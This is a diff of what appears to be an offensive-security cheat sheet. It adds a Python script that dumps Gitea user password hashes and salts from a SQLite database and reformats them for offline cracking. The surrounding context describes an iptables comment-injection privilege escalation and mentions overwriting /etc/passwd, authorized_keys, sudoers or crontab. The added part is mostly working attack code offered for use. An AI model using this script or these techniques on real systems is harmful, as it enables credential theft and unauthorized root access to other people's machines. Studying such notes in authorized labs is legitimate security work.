@@ -3525,12 +3525,56 @@ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[publi
 ```
 - You can overwrite the `/etc/passwd`,`/root/.ssh/authorized_keys`,`/etc/sudoers` or even create a malicious crontab.
 
+----------------
+
+### Script for dumping pkdf2 hashes from Gita
+
+--------------
+
+- Script-:
+
+```python3
+#! /usr/bin/env python3
+import sqlite3
+from tenlib.transform import *
+import sqlite3
+import sys
+set_message_formatter("Oldschool")
+#Preparing Gitea db hashes[pbkdf2]
+#opening db
+def db_name(db_name: str) -> list:
+    try:
+       con =sqlite3.connect(db_name)
+       cur = con.cursor()
+       res = cur.execute("SELECT passwd,salt,name from user")
+       return res.fetchall()
+    except Exception as e:
+         exit("[+] Database doesn't exist")
 
 
+def process_data(data: list):
+    for passwd,salt,name in data:
+        passwd = base64.encode(bytes.fromhex(passwd))
+        salt = base64.encode(bytes.fromhex(salt))
+        hash = f"{name}:sha256:50000:{salt}:{passwd}"
+        print(hash)
 
+def main():
+    if len(sys.argv) != 2:
+        exit("[+]File not provided")
 
+    result = db_name(sys.argv[1])
+    process_data(result)
 
+if __name__ == "__main__":
+    main()
+```
 
+- Usage-:
+
+![image](https://github.com/user-attachments/assets/912ea2d3-ecb2-4b56-b432-da1d630b859c)
+
+------------------
 
 
 
